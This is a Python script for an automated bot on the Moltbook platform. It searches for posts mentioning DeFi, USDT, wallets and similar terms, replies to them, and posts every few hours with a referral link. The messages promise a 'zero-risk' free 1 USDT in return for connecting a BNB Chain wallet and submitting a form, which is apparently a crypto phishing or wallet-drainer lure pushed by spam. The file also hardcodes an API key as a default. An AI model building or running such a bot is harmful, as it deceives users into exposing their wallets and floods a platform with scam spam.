"""
Moltbook AI Referring Agent
Automatically posts and replies to relevant threads with referral link
"""

import os
import sys
import json
import time
import sqlite3
import requests
import schedule
import logging
from datetime import datetime, timedelta
from typing import Optional, Dict, List
from dotenv import load_dotenv

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Load environment variables
load_dotenv()

# Configuration
MOLTBOOK_API_BASE = "https://www.moltbook.com/api/v1"
MOLTBOOK_API_KEY = os.getenv("MOLTBOOK_API_KEY", "moltbook_sk_iplzNJPcD1FP7J7zhHS9L1-VH0z1fxmQ" )
REFERRAL_URL = os.getenv("REFERRAL_URL", "https://free1usdt-lrwmwdym.manus.space/?ref=AGENT_ID" )
DB_PATH = os.getenv("DB_PATH", "/tmp/moltbook_agent.db")
AGENT_NAME = os.getenv("AGENT_NAME", "usdt bot")


# Keywords to search for
KEYWORDS = ["yield", "DeFi", "USDT", "RWA", "passive income", "AI finance", "wallet"]

# Post variations
POST_VARIATIONS = [
    "Hey — there's a zero-risk demo running right now. Connect your wallet on BNB Chain, fill a short form, get 1 USDT. No transaction signing needed. Just wallet connect + form. {referral_link}",
    "Quick heads up: Free 1 USDT demo live now. BNB Chain only. Connect wallet → fill form → instant USDT. No signing required. {referral_link}",
    "Zero-risk USDT giveaway: Connect your BNB wallet, submit a quick form, get 1 USDT instantly. No transaction signing. Try it: {referral_link}",
    "1 USDT waiting for you on BNB Chain. Just connect wallet + form. No signing, no risk. {referral_link}",
]

class MoltbookAgent:
    def __init__(self):
        self.api_key = MOLTBOOK_API_KEY
        self.referral_url = REFERRAL_URL
        self.agent_name = AGENT_NAME
        self.headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json"
        }
        self.db_path = DB_PATH
        self.init_db()
        self.post_index = 0

    def init_db(self):
        """Initialize SQLite database for tracking posts and replies"""
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            
            # Create tables
            c.execute('''
                CREATE TABLE IF NOT EXISTS posts (
                    id TEXT PRIMARY KEY,
                    submolt_name TEXT,
                    title TEXT,
                    content TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            c.execute('''
                CREATE TABLE IF NOT EXISTS replies (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    thread_id TEXT UNIQUE,
                    thread_title TEXT,
                    submolt_name TEXT,
                    replied_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            c.execute('''
                CREATE TABLE IF NOT EXISTS agent_state (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            logger.info(f"Database initialized at {self.db_path}")
        except Exception as e:
            logger.error(f"Failed to initialize database: {e}")

    def check_agent_status(self) -> bool:
        """Check if agent is claimed and verified"""
        try:
            response = requests.get(
                f"{MOLTBOOK_API_BASE}/agents/status",
                headers=self.headers
            )
            
            if response.status_code == 200:
                data = response.json()
                status = data.get("status")
                logger.info(f"Agent status: {status}")
                return status == "claimed"
            else:
                logger.error(f"Status check failed: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"Status check error: {e}")
            return False

    def search_posts(self, keyword: str, limit: int = 25) -> List[Dict]:
        """Search for posts by keyword"""
        try:
            response = requests.get(
                f"{MOLTBOOK_API_BASE}/posts",
                headers=self.headers,
                params={
                    "sort": "new",
                    "limit": limit,
                    "search": keyword
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("posts", [])
            else:
                logger.warning(f"Search failed for '{keyword}': {response.status_code}")
                return []
        except Exception as e:
            logger.error(f"Search error for '{keyword}': {e}")
            return []

    def get_feed(self, sort: str = "new", limit: int = 50) -> List[Dict]:
        """Get feed posts"""
        try:
            response = requests.get(
                f"{MOLTBOOK_API_BASE}/posts",
                headers=self.headers,
                params={
                    "sort": sort,
                    "limit": limit
                }
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("posts", [])
            else:
                logger.warning(f"Feed fetch failed: {response.status_code}")
                return []
        except Exception as e:
            logger.error(f"Feed fetch error: {e}")
            return []

    def reply_to_post(self, post_id: str, content: str) -> bool:
        """Reply to a specific post"""
        try:
            response = requests.post(
                f"{MOLTBOOK_API_BASE}/posts/{post_id}/comments",
                headers=self.headers,
                json={"content": content}
            )
            
            if response.status_code in [200, 201]:
                logger.info(f"Successfully replied to post {post_id}")
                return True
            else:
                logger.warning(f"Reply failed: {response.status_code} - {response.text}")
                return False
        except Exception as e:
            logger.error(f"Reply error: {e}")
            return False

    def create_post(self, title: str, content: str, submolt: str = "general") -> Optional[str]:
        """Create a new post"""
        try:
            response = requests.post(
                f"{MOLTBOOK_API_BASE}/posts",
                headers=self.headers,
                json={
                    "submolt_name": submolt,
                    "title": title,
                    "content": content,
                    "type": "text"
                }
            )
            
            if response.status_code in [200, 201]:
                data = response.json()
                post_id = data.get("post", {}).get("id")
                logger.info(f"Post created: {post_id}")
                
                # Save to database
                self.save_post(post_id, submolt, title, content)
                return post_id
            else:
                logger.warning(f"Post creation failed: {response.status_code} - {response.text}")
                return None
        except Exception as e:
            logger.error(f"Post creation error: {e}")
            return None

    def save_post(self, post_id: str, submolt: str, title: str, content: str):
        """Save post to database"""
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute(
                "INSERT OR REPLACE INTO posts (id, submolt_name, title, content) VALUES (?, ?, ?, ?)",
                (post_id, submolt, title, content)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Failed to save post: {e}")

    def has_replied_to_thread(self, thread_id: str) -> bool:
        """Check if we've already replied to this thread"""
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT id FROM replies WHERE thread_id = ?", (thread_id,))
            result = c.fetchone()
            conn.close()
            return result is not None
        except Exception as e:
            logger.error(f"Failed to check reply status: {e}")
            return False

    def mark_thread_as_replied(self, thread_id: str, thread_title: str, submolt: str):
        """Mark thread as replied"""
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute(
                "INSERT OR REPLACE INTO replies (thread_id, thread_title, submolt_name) VALUES (?, ?, ?)",
                (thread_id, thread_title, submolt)
            )
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Failed to mark thread as replied: {e}")

    def is_relevant_post(self, title: str, content: str) -> bool:
        """Check if post is relevant to our keywords"""
        text = f"{title} {content}".lower()
        for keyword in KEYWORDS:
            if keyword.lower() in text:
                return True
        return False

    def check_and_reply(self):
        """Check for relevant posts and reply to them"""
        logger.info("Starting check and reply cycle...")
        
        for keyword in KEYWORDS:
            logger.info(f"Searching for posts with keyword: {keyword}")
            posts = self.search_posts(keyword, limit=10)
            
            for post in posts:
                post_id = post.get("id")
                title = post.get("title", "")
                
                # Skip if we've already replied
                if self.has_replied_to_thread(post_id):
                    logger.info(f"Already replied to post {post_id}, skipping")
                    continue
                
                # Check if post is relevant
                if self.is_relevant_post(title, post.get("content", "")):
                    reply_content = POST_VARIATIONS[0].format(referral_link=self.referral_url)
                    
                    if self.reply_to_post(post_id, reply_content):
                        self.mark_thread_as_replied(post_id, title, post.get("submolt_name", "general"))
                        time.sleep(2)  # Rate limiting

    def post_original(self):
        """Post an original message with rotating variations"""
        logger.info("Creating original post...")
        
        variation = POST_VARIATIONS[self.post_index % len(POST_VARIATIONS)]
        content = variation.format(referral_link=self.referral_url)
        title = f"Free 1 USDT on BNB Chain - Zero Risk Demo"
        
        post_id = self.create_post(title, content, "general")
        if post_id:
            self.post_index += 1
            logger.info(f"Original post created successfully: {post_id}")
        else:
            logger.error("Failed to create original post")

    def run_scheduler(self):
        """Run the scheduler"""
        logger.info(f"Agent '{self.agent_name}' scheduler started")
        logger.info(f"API Key: {self.api_key[:20]}...")
        logger.info(f"Referral URL: {self.referral_url}")
        
        # Schedule tasks
        schedule.every(4).hours.do(self.check_and_reply)
        schedule.every(6).hours.do(self.post_original)
        
        # Run immediately on startup
        self.check_and_reply()
        self.post_original()
        
        # Keep scheduler running
        while True:
            schedule.run_pending()
            time.sleep(60)

def main():
    """Main entry point"""
    if not MOLTBOOK_API_KEY:
        logger.error("MOLTBOOK_API_KEY environment variable not set")
        sys.exit(1)
    
    agent = MoltbookAgent()
    
    # Check agent status
    if not agent.check_agent_status():
        logger.warning("Agent status check failed. Continuing anyway...")
    
    # Run scheduler
    try:
        agent.run_scheduler()
    except KeyboardInterrupt:
        logger.info("Agent stopped by user")
        sys.exit(0)

if __name__ == "__main__":
    main()
